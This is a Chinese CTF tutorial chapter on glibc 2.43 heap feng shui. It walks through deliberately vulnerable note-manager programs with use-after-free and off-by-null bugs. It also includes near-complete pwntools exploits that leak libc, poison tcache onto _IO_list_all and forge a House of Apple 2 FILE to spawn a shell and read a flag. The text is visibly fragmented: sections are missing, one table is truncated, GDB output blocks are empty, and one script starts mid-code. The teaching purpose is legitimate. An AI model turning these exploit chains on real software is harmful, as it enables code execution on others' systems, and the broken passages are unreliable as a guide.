# P17 堆风水与通用利用思路
## Heap Feng Shui & General Exploitation Methodology

## 1. 从"学过技术"到"拿到题目"

[[P12-glibc堆管理机制|P12]] 讲堆管理器，[[P13-基础堆漏洞|P13]] 讲漏洞原料，[[P14-tcache与fastbin利用|P14]] 讲任意地址分配，[[P15-House系列攻击技术|P15]] 与 [[P16-FSOP与HouseofApple2|P16]] 讲执行落点——五章合起来是按**技术**组织的。真实题目不按技术组织：附件只给一个菜单程序和一句"存在漏洞"，哪个技术能用、按什么顺序用，要自己推。把 [[P01-PWN导论与缓解机制全景#2. 利用链构建的五步流程|P1 第 2 节]]的五步流程平移到堆题上，就是本章的主线：

| 步骤 | 堆题上做什么 | 本章位置 |
| ---- | ---- | ---- |
| 1. 查保护 | checksec 划掉不可行的落点（Full RELRO 封死 GOT，NX 封死 shellcode） | 4.1 |

[[P13-基础堆漏洞|P13]] 末尾给过一条经验：堆题的漏洞几乎都在"编辑与释放的逻辑"上。本章把它细化成一套可执行的试探动作，并全程贯穿两道综合题。

## 2. 堆风水：布局是设计出来的

**堆风水**（heap feng shui）指主动设计堆布局：控制分配顺序、挑选尺寸、决定谁与谁相邻、在哪个位置留洞——让目标块恰好落在攻击原语够得着的位置。它不是一项独立攻击技术，而是所有堆利用的前置工序：[[P14-tcache与fastbin利用|P14]] 的 poisoning 需要"两个同档的块先后进 tcache"，[[P16-FSOP与HouseofApple2|P16]] 的伪造 FILE 需要"一块地址已知、内容可写的大块"，off-by-null 需要"溢出源紧挨着目标"——这些条件没有一个是免费的，全是布局给出来的。

### 2.1 三条设计杠杆

- **顺序**：malloc 在各 bin 都落空时从 top 顺序切分（[[P12-glibc堆管理机制#4. malloc 的主干流程|P12 第 4 节]]），==先分配的块在低地址==。A、B、C 依次 new 出来，就依次排开；想让"溢出源"和"目标"相邻，就让它们在分配序列里紧挨着。
- **尺寸**：尺寸决定两件事——换算成哪个档位（式 12.1），以及 free 后的去向（tcache / smallbin / unsorted / 并入 top）。0x408 与 0x409 一字节之差，free 后一个进 tcache、一个进 unsorted，能做的事完全不同。
- **垫块与空洞**：相邻空闲块会被合并（[[P12-glibc堆管理机制#6.2 前向合并：邻居空闲或挨着 top|P12 6.2]]），挨着 top 的块 free 时直接并进 top。==在大块后面垫一个在用的小块，它才留得住==；反过来，free 掉中间的块再按同尺寸申请，可以精确把新块**放回洞里**，重新安排相邻关系。

### 2.2 碎片与合并的账本

布局是在账本约束下做的：free 一个块时，==该档 tcache 没满就根本不看邻居==（[[P12-glibc堆管理机制#5. free 的主干流程|P12 第 5 节]]的 warning）。2.43 每档默认 16 个，意味着：

- 想让两个相邻块合并，先把这一档**装满 16 个**（或直接用超出 tcache 范围的 ≥ 0x420 的大块）；
- 想让块保持独立（比如两个都要进 smallbin 当 stashing 的靶子），要么错开档位，要么中间垫在用块——[[P14-tcache与fastbin利用#7.2 布局与条件|P14 7.2]] 的布局要点里这是一条硬约束。

> [!warning] 账本步距按版本算
> 老题解"free 7 个装满 tcache"在本机要乘以 16/7；"第 8 个 free 进 fastbin"在本机不存在（2.43 移除了 fastbin）。对照表在 [[P12-glibc堆管理机制#9. glibc 2.43 行为注记|P12 第 9 节]]，读老题解先查表再算布局。

### 2.3 布局前后对照：用 P12 的观察脚本看设计落地

布局设计完要用 [[P12-glibc堆管理机制#7. 调试方法：GDB 原生加自写堆观察脚本|P12 第 7 节]]的 `heapview` + `tcacheview` 对照：每个动作前后各看一眼，确认"新块落在预想的位置、free 后进了预想的去处"。演示程序把 2.1 的杠杆各演一遍（x86-64 Linux，glibc 2.43）：

```c
/* p17_fengshui.c —— 堆风水演示：布局、空洞、垫块与档位分界（x86-64 Linux，glibc 2.43） */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static char *src, *pad, *victim_far, *victim;
static void *gbad, *big, *q, *gok, *q2, *s1, *g1, *s2, *g2;

static void mark(const char *s) {
    printf("---- %s ----\n", s);
}

int main(void) {
    setbuf(stdout, NULL);

    /* A：坏布局——溢出源和目标之间隔着一个大块 */
    src = malloc(0x68);          /* 溢出源 */
    pad = malloc(0x208);         /* 先占住 src 右边的位置 */
    victim_far = malloc(0x68);   /* 真正想写的目标，被挤远了 */
    printf("src = %p\npad = %p\nvictim_far = %p\n", src, pad, victim_far);
    mark("A：坏布局完成，victim_far 与 src 之间隔着 0x210 的 pad");

    /* B：挖洞——释放 pad，0x210 档出现一个空洞 */
    free(pad);
    mark("B：free(pad) 完成，中间留洞");

    /* C：定点投放——同尺寸请求正好落回洞里，victim 与 src 紧邻 */
    victim = malloc(0x208);
    printf("victim = %p\n", victim);
    mark("C：victim 落进空洞，与 src 紧邻");

    /* D：越界写 0x10 字节，正好压在 victim 的块头上 */
    memset(src, 0x42, 0x68);
    unsigned long *ov = (unsigned long *)(src + 0x60);
    ov[0] = 0x70;                /* victim 的 prev_size 槽（随手写个自洽值） */
    ov[1] = 0x210;               /* victim 的 size 槽：原值 0x211，PREV_INUSE 被清 0 */
    mark("D：越界写 0x10 字节完成，victim 的块头被改写");

    /* E1：垫块垫在前面——free 直接并进 top，什么也留不下 */
    gbad = malloc(0x20);
    big = malloc(0x500);
    printf("E1: big = %p（右边是 top）\n", big);
    free(big);
    mark("E1：垫块在前面，free(big) 并进了 top");

    /* E2：垫块垫在后面——大块进 unsorted，fd/bk 带出 main_arena 地址 */
    q = malloc(0x500);
    gok = malloc(0x20);          /* 垫块在后面，q 的右边不是 top */
    printf("E2: q = %p gok = %p\n", q, gok);
    free(q);
    mark("E2：垫块在后面，free(q) 进了 unsorted");

    /* E3：精确取回，恢复空链，后面的演示不受残留影响 */
    q2 = malloc(0x500);
    printf("E3: q2 = %p（q 的块回来了）\n", q2);

    /* F：0x408 与 0x409 一档之隔，free 去向完全不同 */
    s1 = malloc(0x408);          /* nb 0x410：tcache 收的最后一档 */
    g1 = malloc(0x20);
    s2 = malloc(0x409);          /* nb 0x420：超出 tcache 范围 */
    g2 = malloc(0x20);
    printf("F: s1 = %p s2 = %p\n", s1, s2);
    free(s1);                    /* 进 tcache[0x410]，堆面无痕 */
    free(s2);                    /* 走合并路径，进 unsorted */
    mark("F：free(s1)、free(s2) 完成，去向分界");
    (void)gbad; (void)g1; (void)g2;
    return 0;
}
```

阶段 A→C 是"挖洞—回填"的完整落地：pad（0x405080）free 后进 tcache[0x210]，同尺寸的 victim 申请正好落回 0x405080——==victim 从"隔着 0x210 的远邻"变成了 src 的紧邻==。阶段 D 在这紧邻关系上越界写 0x10 字节，GDB 在写之前与之后各停一次，对准 victim 的块头：

```text

size  = 0x210（原始值 0x210）
flags = 0x0（0）
```

`0x211 → 0x210`，清掉的正是最低位的 PREV_INUSE——从这一刻起，管理器读到的世界是"src 已经空闲"。这是堆上几乎所有"块头伪造"类漏洞（off-by-one、off-by-null、越界写）的共同形状，==布局做到"紧邻"，原语才够得着这一格==。4.7 的变体题用的就是这个形状的克制版（只能写进一个 `\0`）。

> [!warning] heapview 的括号标注是启发式，不是结论
> 阶段 D 的输出里有一行 `空闲可合并 fd 0x4242424242424242 … (fd/bk 指向 libc 的 main_arena)`——括号里那句是脚本的猜测（fd 不落在堆区间内就标注），这里的 fd 只是 `memset` 填进去的 0x42，与 main_arena 无关。==脚本替你整理字段，判断仍要看数据本身==：真 main_arena 指针长成 `0x7f…` 且落在 libc 区间。

### 2.4 unsorted 残留：libc 泄露的最短路径

[[P12-glibc堆管理机制#3.4 unsorted bin：大块的中转站|P12 3.4]]说过：进 unsorted 的块，fd/bk 指向 main_arena 里的链头——==拿到这个值等于拿到 libc 泄露==。本节把"残留"的三种形态一次看全，演示程序读自己的基址做对照（x86-64 Linux，glibc 2.43）：

```c
/* p17_leak.c —— unsorted bin 泄露 libc 的三种形态（x86-64 Linux，glibc 2.43）
 * 1. 直接残留：free 大块，fd/bk 留下 unsorted 链头（main_arena 内）
 * 2. 切割残留：从 unsorted 大块上切一刀，交付块的前 16 字节带着旧 fd/bk
 * 3. 合并残留：两块相邻大块合并成一个，fd/bk 留在合并块上
 * 垫块统一放在大块后面：大块右边是在用块，free 才不会并进 top。
 * 读 libc 基址用 open/read：stdio 一旦打开文件就会 malloc，污染堆布局。
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

static unsigned long libc_base(void) {
    char buf[16384];
    int fd = open("/proc/self/maps", O_RDONLY);
    if (fd < 0) return 0;
    size_t got = 0;
    for (;;) {
        ssize_t r = read(fd, buf + got, sizeof buf - got - 1);
        if (r <= 0) break;
        got += (size_t)r;
        if (got >= sizeof buf - 1) break;
    }
    close(fd);
    buf[got] = 0;
    char *s = strstr(buf, "libc.so.6");
    if (s) {
        while (s > buf && *s != '\n') s--;
        if (*s == '\n') s++;
        return strtoul(s, NULL, 16);
    }
    return 0;
}

int main(void) {
    setbuf(stdout, NULL);
    unsigned long base = libc_base();
    printf("libc base            = %#lx\n", base);

    /* 1. 直接残留 */
    void *p = malloc(0x500);             /* 0x510 超出 tcache 上限 0x410 */
    void *guard1 = malloc(0x20);         /* 垫块：垫在后面，free(p) 不并进 top */
    printf("p                    = %p\n", p);
    free(p);                             /* 走合并路径，进 unsorted */
    unsigned long *u = (unsigned long *)p;
    printf("[1] free 后 fd       = %#lx\n", u[0]);
    printf("[1] free 后 bk       = %#lx\n", u[1]);
    printf("[1] fd - libc base   = %#lx\n", u[0] - base);

    /* 2. 切割残留：从 unsorted 的 0x510 上切出 0x410 */
    unsigned long *a = (unsigned long *)malloc(0x400);
    printf("[2] a                = %p\n", (void *)a);
    printf("[2] a[0]（未初始化） = %#lx\n", a[0]);
    printf("[2] a[0] - libc base = %#lx\n", a[0] - base);
    free(a);

    /* 把 [2] 留在 unsorted 里的 0x100 last_remainder 取走，恢复空链 */
    void *rest = malloc(0xf0);           /* nb 0x100，unsorted 精确命中 */
    (void)rest;

    /* 3. 合并残留：两块相邻 0x500 合并成 0xa20 */
    void *y1 = malloc(0x500);
    void *y2 = malloc(0x500);
    void *guard2 = malloc(0x20);
    printf("y1                   = %p\n", y1);
    printf("y2                   = %p\n", y2);
    free(y1);
    free(y2);                            /* 后向合并成 0xa20，留在 unsorted */
    unsigned long *m = (unsigned long *)y1;
    printf("[3] 合并后 fd        = %#lx\n", m[0]);
    printf("[3] 合并后 bk        = %#lx\n", m[1]);
    printf("[3] fd - libc base   = %#lx\n", m[0] - base);
    return 0;
}
```

三种形态逐条读：

- **直接残留**（形态 1）：0x510 的块超出 tcache 范围，free 直接进 unsorted，fd、bk 都是 unsorted 链头。==libc 基址 = 泄露值 − 0x212ac8==，减完应该页对齐（低 12 位为 0），这个自查要养成习惯。
- **切割残留**（形态 2）：malloc 遍历 unsorted 时，0x510 的块先被搬进 **largebin** 再被切分，交付块的 fd 槽里留下的是**上一位主人**写的 largebin 链头——偏移是 0x212ef8，不是 0x212ac8。==残留值是哪个 bin 的头，取决于这块在被读之前挂在哪条链上==；malloc 出来的块不做初始化，旧值原样保留。读它的前提只是一个"能读已分配内存"的原语（UAF 的 show、或把新块分到旧数据上）。
- **合并残留**（形态 3）：相邻两块 free 合并成 0xa20，合并块留在 unsorted，fd/bk 再次指向链头。==合并不清除 fd/bk，只改 size==，这是 [[P12-glibc堆管理机制#6.1 后向合并：PREV_INUSE 为 0 时吃掉前块|P12 6.1]]的机制送上门的泄露。

> [!info]- 偏移为什么每个环境要标定一次
> 0x212ac8 这个数是"unsorted 链头相对 libc 基址的偏移"，随 libc 版本与编译配置变化。标定方法：`setarch -R ./程序` 关掉 ASLR（libc 固定装载在基址），读一次 fd，减基址即得；或者 GDB 里 `p/x (unsigned long)&main_arena` 对照。打远程时用题目附件的 libc 重量（[[P03-ELF链接与延迟绑定#5.3 patchelf：把题目环境装到本地|P3 5.3]] 的 patchelf 装载）。

> [!note] 与 P14 的泄露口径是一件事
> [[P14-tcache与fastbin利用#3.2 第一步：show 读出空链形状，拿到堆页号|P14 3.2]] 的 safe-linking 空链泄露的是**堆**页号，本节泄露的是 **libc** 基址；两把钥匙一把开 tcache poisoning 的加密锁，一把开最后落点的地址锁。主挑战里两把都要拿。

## 3. 交互试探：把漏洞问出来

拿到题先别急着读反编译。菜单程序的每个选项都是一个可实验的接口，==漏洞几乎总能用几次构造好的交互探出来==。试探清单按选项过一遍：

### 4.1 题目与初始侦察

主挑战是一个菜单堆题（x86-64 Linux，glibc 2.43），行为规则如下——真实比赛里这一段要从交互和反汇编里自己读出来：

```c
/* p17_note.c —— 综合练习题：note manager（x86-64 Linux，glibc 2.43）
 * 菜单：
 *   1. create：申请一块 note（0x18–0x500 字节），打印分配地址，不读数据
 *   2. edit  ：向 note 写入恰好 size 字节
 *   3. delete：释放 note
 *   4. show  ：打印 note 的前 0x10 字节；全局电量只有 1 次
 *   5. exit  ：退出程序
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define MAXN 16

static void *ptr[MAXN];
static size_t sz[MAXN];
static int show_left = 1;

static void menu(void) {
    puts("== note manager ==");
    puts("1. create");
    puts("2. edit");
    puts("3. delete");
    puts("4. show");
    puts("5. exit");
    printf("> ");
}

static void readline(char *buf, size_t n) {
    size_t i = 0;
    while (i + 1 < n) {
        char c;
        ssize_t r = read(0, &c, 1);
        if (r <= 0) break;
        if (c == '\n') break;
        buf[i++] = c;
    }
    buf[i] = 0;
}

static long readlong(void) {
    char buf[32];
    readline(buf, sizeof buf);
    return strtol(buf, NULL, 0);
}

static void readn(void *dst, size_t n) {
    size_t got = 0;
    while (got < n) {
        ssize_t r = read(0, (char *)dst + got, n - got);
        if (r <= 0) break;
        got += (size_t)r;
    }
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    for (;;) {
        menu();
        long choice = readlong();
        if (choice == 1) {
            int i = -1;
            for (int k = 0; k < MAXN; k++)
                if (ptr[k] == NULL) { i = k; break; }
            if (i < 0) { puts("[-] full"); continue; }
            printf("size: ");
            long size = readlong();
            if (size < 0x18 || size > 0x500) { puts("[-] bad size"); continue; }
            ptr[i] = malloc((size_t)size);
            sz[i] = (size_t)size;
            printf("[+] note[%d] at %p, size %#lx\n", i, ptr[i], sz[i]);
        } else if (choice == 2) {
            printf("idx: ");
            long i = readlong();
            if (i < 0 || i >= MAXN || ptr[i] == NULL) { puts("[-] empty"); continue; }
            printf("data: ");
            readn(ptr[i], sz[i]);
            puts("[+] edited");
        } else if (choice == 3) {
            printf("idx: ");
            long i = readlong();
            if (i < 0 || i >= MAXN || ptr[i] == NULL) { puts("[-] empty"); continue; }
            free(ptr[i]);            /* 释放后指针不清空 */
            puts("[+] deleted");
        } else if (choice == 4) {
            if (show_left <= 0) { puts("[-] battery empty"); continue; }
            printf("idx: ");
            long i = readlong();
            if (i < 0 || i >= MAXN || ptr[i] == NULL) { puts("[-] empty"); continue; }
            write(1, ptr[i], 0x10);
            putchar('\n');
            show_left--;
        } else if (choice == 5) {
            puts("bye");
            return 0;                /* main 返回，走正常退出流程 */
        }
    }
}
```

### 4.3 布局设计与一次 show 的用法

show 只有 1 次，libc 泄露（unsorted 残留）与堆泄露（程序打印）里前者是稀缺资源。布局按四个角色排（顺序即 create 顺序）：

| 角色 | 尺寸 | 作用 |
| ---- | ---- | ---- |
| note[0] 泄露块 | 0x500 | 0x510 的 chunk，free 直进 unsorted，fd 留下链头 |
| note[1] 垫块 | 0x20 | 垫在泄露块右边，free 时并不了 top（2.1 的杠杆） |
| note[2] 容器 | 0x500 | 伪造 FILE 三件套的住址，地址由 create 打印免费给出 |
| note[3]、note[4] | 0x68 ×2 | poisoning 组：先后 free 进 tcache[0x70]，UAF 改其中一个的 fd |

唯一的一次 show 花在 delete(note0) 之后：读 note0 的前 16 字节，第一个 8 字节就是 unsorted 链头。==布局的关键约束只有两条==：泄露块的右边必须有垫块（否则 2.3 的 E1 下场）；poisoning 组的尺寸（0x68 → 0x70 档）与泄露块（0x510）错开，互不干扰账本。

> [!info]- 这套布局里 tcache 结构体会落在哪里
> 2.43 的 tcache 结构体在线程第一次"档内 free"时才初始化，==结构体本体走一次正常的 malloc==：unsorted 里有现成大块就先切它，没有才切 top。本布局里第一次档内 free 是 delete(note[3])，此刻 unsorted 里躺着 note[0] 的 0x510——结构体（0x300）就从它前部切走，余下 0x210 留在 unsorted。这不影响本题：show 泄露发生在 delete(note[3]) **之前**，泄露块的历史使命已经完成；note[2] 的容器在结构体之后、位置不受影响。==做布局时把"结构体从哪切"算进账本==，是 2.43 布局题的新增功课——4.7 的变体会看到算错它的代价。

### 4.4 tcache poisoning：让 malloc 落在 `_IO_list_all`

[[P14-tcache与fastbin利用#3. tcache poisoning：完整主线|P14 第 3 节]]的完整链路在这里照抄：delete(note[3])、delete(note[4]) 让 0x70 档串成 `note4 → note3`，UAF 的 edit 改 note4 的 fd——按 safe-linking 公式（式 14.1）加密后指向 `_IO_list_all`：

$$\text{存储值} = \left( \text{存储位置} \gg 12 \right) \oplus \text{目标地址} \tag{17.1}$$

之后两次 create(0x68)：第一次弹出 note4，第二次分配器交出的就是 `_IO_list_all` 本身——它 16 字节对齐（[[P16-FSOP与HouseofApple2#2.1 三个流、三个静态结构与一条链|P16 2.1]]验证过），过得了 tcache 取出的对齐检查。新槽位的 len 是 0x68，对它 edit 8 字节就等于==改写 libc 数据段里的遍历起点==，任意写到手。

### 4.5 House of Apple 2：伪 FILE 三件套与触发

伪造结构的字段表、每条约束对应的检查，[[P16-FSOP与HouseofApple2#5.2 需要控制的字段全集|P16 5.2]] 已逐项列过，这里只落位：伪 FILE、伪 `_IO_wide_data`、伪 `_wide_vtable` 三样全部写进 note[2] 这一块 0x500 的容器，`_flags` 与 `_IO_read_ptr` 两个槽位拼出 `"    /bin/sh"` 字符串，vtable 借合法的 `_IO_wfile_jumps` 过区间校验，最后一跳落在 `__doallocate` 槽位的 `system` 上（x86-64 Linux / System V AMD64 ABI，`rdi = fp`，于是 `system(fp)` 执行的正是 fp 起始的那条命令）。触发用菜单选 5：main 返回 → `exit` → `_IO_cleanup` → `_IO_flush_all` 沿链遍历（[[P16-FSOP与HouseofApple2#4.2 触发路径：谁会去遍历这条链|P16 4.2]] 的路径二）。

### 4.6 完整 exploit 与 getshell

```python
      -> delete 后 show 读 unsorted 残留泄露 libc
      -> 堆上摆 House of Apple 2 三件套
      -> tcache poisoning 让 malloc 落在 _IO_list_all -> 改链头指向伪 FILE
      -> exit 触发 _IO_flush_all -> system("    /bin/sh")
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

    p.recvuntil(b'size: ')
    p.sendline(hex(size).encode())
    line = p.recvline().decode().strip()
    idx = int(line.split('note[')[1].split(']')[0])
    addr = int(line.split(' at ')[1].split(',')[0], 16)
    log.info('create note[%d] %#x bytes -> %#x', idx, size, addr)
    return idx, addr

def edit(idx, data, size):
    menu(2)
    p.recvuntil(b'idx: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'data: ')
    p.send(data.ljust(size, b'\x00')[:size])
    p.recvline()

def delete(idx):
    menu(3)
    p.recvuntil(b'idx: ')
    p.sendline(str(idx).encode())
    p.recvline()

def show(idx):
    menu(4)
    p.recvuntil(b'idx: ')
    p.sendline(str(idx).encode())
    return p.recvn(16)

# ---------- 第 1 步：布局 ----------
i0, a0 = create(0x500)         # note[0]：泄露块（0x510 的 chunk，free 直进 unsorted）
i1, a1 = create(0x20)          # note[1]：垫块，让泄露块右边不是 top
i2, a2 = create(0x500)         # note[2]：伪 FILE 容器
i3, a3 = create(0x68)          # note[3]：poisoning 组
i4, a4 = create(0x68)          # note[4]：poisoning 组

# ---------- 第 2 步：delete 后用唯一的 show 读残留 ----------
delete(i0)
leak = u64(show(i0)[:8])
assert leak & 0xfff == (K_UNSORTED & 0xfff), '泄露值形状不对: %#x' % leak
libc.address = leak - K_UNSORTED
log.success('leak      = %#x（unsorted 链头）', leak)
log.success('libc base = %#x', libc.address)

# ---------- 第 3 步：伪 FILE 三件套写进 note[2]（House of Apple 2）----------
buf = bytearray(0x500)
def put(off, data):
    buf[off:off + len(data)] = data

put(0x00, b'    /bin')                       # _flags：兼作 system 参数的开头
put(0x08, b'/sh\x00')                        # 接上 "/sh" -> "    /bin/sh"
put(0x20, p64(0))                            # _IO_write_base = 0
put(0x28, p64(1))                            # _IO_write_ptr = 1（> base 才调 overflow）
put(0x68, p64(0))                            # _chain = NULL，遍历到此为止
put(0x88, p64(a2 + 0x300))                   # _lock：可写内存即可
put(0xa0, p64(a2 + 0x100))                   # _wide_data
put(0xc0, p32(0))                            # _mode = 0
put(0xd8, p64(libc.sym['_IO_wfile_jumps']))  # vtable：合法跳表，过区间校验
put(0x100 + 0x18, p64(0))                    # wide_data->_IO_write_base = NULL
put(0x100 + 0x30, p64(0))                    # wide_data->_IO_buf_base = NULL
put(0x100 + 0xe0, p64(a2 + 0x200))           # wide_data->_wide_vtable（无校验）
put(0x200 + 0x68, p64(libc.sym['system']))   # wide_vtable->__doallocate = system
edit(i2, bytes(buf), 0x500)

# ---------- 第 4 步：tcache poisoning，把 malloc 指到 _IO_list_all ----------
delete(i3)
delete(i4)                     # tcache[0x70]: a4 -> a3
target = libc.sym['_IO_list_all']
poison = target ^ (a4 >> 12)   # safe-linking：存储值 = 目标 ^ (存储位置 >> 12)
log.info('_IO_list_all = %#x（16 对齐: %s）', target, (target & 0xf) == 0)
edit(i4, p64(poison), 0x68)
create(0x68)                   # 弹出 a4
i6, back = create(0x68)        # 弹出被污染的链头：mem = &_IO_list_all
assert back == target, 'poisoning 未命中: %#x' % back
log.success('malloc 落在 _IO_list_all：note[%d] = %#x', i6, back)

# ---------- 第 5 步：_IO_list_all 指向伪 FILE ----------
edit(i6, p64(a2), 0x68)

# ---------- 第 6 步：exit 触发 _IO_flush_all -> system("    /bin/sh") ----------
menu(5)
p.recvuntil(b'bye')
p.sendline(b'echo === p17 shell ok ===; cat flag.txt')
print(p.recvrepeat(5).decode(errors='replace'))
```

### 4.7 变体：把起点换成 off-by-null

主挑战的起点是 UAF。变体把 free 改成"释放即清指针"，把 edit 改成"写满 size 字节后补一个 `\0`"——第 3 节试探清单里的另一类起点（x86-64 Linux，glibc 2.43，保护与主挑战相同）：

```c
/* p17_obn.c —— 变体题：note manager（off-by-null 版）（x86-64 Linux，glibc 2.43）
 * 与主挑战 p17_note.c 的差别只有两处：
 *   1. delete 释放后把指针清空——没有 UAF；
 *   2. edit 写完 size 字节后，在第 size 字节补一个 '\0'——off-by-null。
 * 菜单：
 *   1. create：申请一块 note（0x18–0x4f8 字节），打印分配地址，不读数据
 *   2. edit  ：向 note 写入恰好 size 字节，末尾再补一个 '\0'
 *   3. show  ：打印 note 的前 0x10 字节（不限次数）
 *   4. delete：释放 note，指针清空
 *   5. exit  ：退出程序
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define MAXN 16

static void *ptr[MAXN];
static size_t sz[MAXN];

static void menu(void) {
    puts("== note manager (null edition) ==");
    puts("1. create");
    puts("2. edit");
    puts("3. show");
    puts("4. delete");
    puts("5. exit");
    printf("> ");
}

static void readline(char *buf, size_t n) {
    size_t i = 0;
    while (i + 1 < n) {
        char c;
        ssize_t r = read(0, &c, 1);
        if (r <= 0) break;
        if (c == '\n') break;
        buf[i++] = c;
    }
    buf[i] = 0;
}

static long readlong(void) {
    char buf[32];
    readline(buf, sizeof buf);
    return strtol(buf, NULL, 0);
}

static void readn(void *dst, size_t n) {
    size_t got = 0;
    while (got < n) {
        ssize_t r = read(0, (char *)dst + got, n - got);
        if (r <= 0) break;
        got += (size_t)r;
    }
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    for (;;) {
        menu();
        long choice = readlong();
        if (choice == 1) {
            int i = -1;
            for (int k = 0; k < MAXN; k++)
                if (ptr[k] == NULL) { i = k; break; }
            if (i < 0) { puts("[-] full"); continue; }
            printf("size: ");
            long size = readlong();
            if (size < 0x18 || size > 0x4f8) { puts("[-] bad size"); continue; }
            ptr[i] = malloc((size_t)size);
            sz[i] = (size_t)size;
            printf("[+] note[%d] at %p, size %#lx\n", i, ptr[i], sz[i]);
        } else if (choice == 2) {
            printf("idx: ");
            long i = readlong();
            if (i < 0 || i >= MAXN || ptr[i] == NULL) { puts("[-] empty"); continue; }
            printf("data: ");
            readn(ptr[i], sz[i]);
            ((char *)ptr[i])[sz[i]] = 0;   /* 漏洞点：末尾补 '\0' 压进下一块块头 */
            puts("[+] edited");
        } else if (choice == 3) {
            printf("idx: ");
            long i = readlong();
            if (i < 0 || i >= MAXN || ptr[i] == NULL) { puts("[-] empty"); continue; }
            write(1, ptr[i], 0x10);
            putchar('\n');
        } else if (choice == 4) {
            printf("idx: ");
            long i = readlong();
            if (i < 0 || i >= MAXN || ptr[i] == NULL) { puts("[-] empty"); continue; }
            free(ptr[i]);
            ptr[i] = NULL;                 /* 指针清空：没有 UAF */
            sz[i] = 0;
            puts("[+] deleted");
        } else if (choice == 5) {
            puts("bye");
            return 0;                      /* main 返回，走正常退出流程 */
        }
    }
}
```

一个 `\0` 能改的只有下一块 size 槽的最低字节：把 `0x501` 写成 `0x500`，==干的是同一件事——清掉 PREV_INUSE，谎报"我前面那块已经空闲"==（2.3 阶段 D 的克制版）。谎报之后，让管理器自己做一次后向合并（[[P12-glibc堆管理机制#6.1 后向合并：PREV_INUSE 为 0 时吃掉前块|P12 6.1]]），把一块**还在使用**的块 unlink 进来，就能合并出一块覆盖在用块的大空闲块——重叠（overlapping chunk）到手。整条链分四步：

1. **布局**：B（溢出源）、C（受害者）相邻，右边垫块；另 free 一块牺牲块把 tcache 结构体引到 top 上（4.3 折叠框的新功课）；
2. **伪造**：edit(B) 在自己的数据区摆好 unlink 的自指指针（fd = bk = B 的 chunk 地址），同时在 C 的 prev_size 槽写 `0x500`；末尾补的 `\0` 清掉 C 的 PREV_INUSE；
3. **合并**：delete(C)——后向合并按 prev_size 找到 B，`chunksize(B) == prev_size` 与 unlink 的双向检查全过（B 是在用块，fd/bk 是可随意编辑的用户数据），0xa00 的大块进 unsorted；
4. **兑换**：show(B) 读合并残留泄露 libc；从大块上切一个 0x70 的小块，它落回 B 的位置——==与仍存活的 note[B] 槽位重叠==，等价于一支"UAF 写"；用它改 tcache fd，poisoning 指向 `_IO_list_all`，端游与主挑战完全相同。

第 2、3 步值得先在 GDB 里看一眼现场再写 exp——断在 free 调用行（`if i == 1` 只命中 delete(C) 那次）与 show 的 write 行：

```text

0x555555559500:	0x0000000000000500	0x0000000000000500
```

三个读点：C 的两个槽位 `prev_size = 0x500`、`size = 0x500`（原值 0x501，PREV_INUSE 已清）；B 的前 16 字节是两个指向自己的指针——unlink 的检查 `fd->bk == p && bk->fd == p` 要的就是这个形状；合并后 `0x500 + 0x500 = 0xa00` 一块进 unsorted，fd/bk 是现成的 libc 泄露。第 2、3 行（0x90、0x300）是牺牲块与 tcache 结构体——==它们不在 B/C 的作业面上，布局把它们让开了==。

完整 exp：

```python
#!/usr/bin/env python3
"""exp_obn.py —— p17_obn（off-by-null 变体）完整利用链（glibc 2.43）
流程：off-by-null 清掉下一块的 PREV_INUSE 并伪造 prev_size
      -> free 触发后向合并，unlink 一块"在用"的块 -> 0xa00 大块进 unsorted
      -> show 读残留泄露 libc；再从大块上切小块，与旧指针重叠
      -> 重叠出的"悬垂写"改 tcache fd -> malloc 落在 _IO_list_all
      -> House of Apple 2 伪 FILE -> exit 触发 -> system("    /bin/sh")
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

K_UNSORTED = 0x212ac8          # unsorted 链头相对 libc 基址的偏移

libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
p = process('./p17_obn')

def menu(choice):
    p.recvuntil(b'> ')
    p.sendline(str(choice).encode())

def create(size):
    menu(1)
    p.recvuntil(b'size: ')
    p.sendline(hex(size).encode())
    line = p.recvline().decode().strip()
    idx = int(line.split('note[')[1].split(']')[0])
    addr = int(line.split(' at ')[1].split(',')[0], 16)
    log.info('create note[%d] %#x bytes -> %#x', idx, size, addr)
    return idx, addr

def edit(idx, data, size):
    menu(2)
    p.recvuntil(b'idx: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'data: ')
    p.send(data.ljust(size, b'\x00')[:size])
    p.recvline()

def show(idx):
    menu(3)
    p.recvuntil(b'idx: ')
    p.sendline(str(idx).encode())
    return p.recvn(16)

def delete(idx):
    menu(4)
    p.recvuntil(b'idx: ')
    p.sendline(str(idx).encode())
    p.recvline()

# ---------- 第 1 步：布局：B、C 相邻，右边垫一块 ----------
i0, b_mem = create(0x4f8)      # B：溢出源，chunk 在 b_mem-0x10
i1, c_mem = create(0x4f8)      # C：受害者，chunk 紧跟在 B 后面（0x500 间隔）
i2, g_mem = create(0x68)       # 垫块：让 C 的右边不是 top

# 初始化 tcache：2.43 在第一次"档内 free"才点亮 tcache，
# 结构体优先从 unsorted 的大块上切——先 free 一块牺牲块，把结构体引到 top 上，
# 免得它落进 B/C 这片即将开刀的区域。
i3, s_mem = create(0x88)
delete(i3)
b_chunk = b_mem - 0x10
assert c_mem - b_mem == 0x500, 'B、C 不相邻，布局失败'
log.info('B chunk = %#x  C chunk = %#x', b_chunk, c_mem - 0x10)

# ---------- 第 2 步：off-by-null：清 PREV_INUSE + 伪造 prev_size ----------
payload = bytearray(0x4f8)
payload[0x00:0x08] = p64(b_chunk)      # 伪 fd：unlink 的自指指针
payload[0x08:0x10] = p64(b_chunk)      # 伪 bk
payload[0x4f0:0x4f8] = p64(0x500)      # C 的 prev_size：谎称"前面有一块 0x500 空闲"
edit(i0, bytes(payload), 0x4f8)        # 末尾补的 '\0' 落在 C.size 最低字节：0x501 -> 0x500

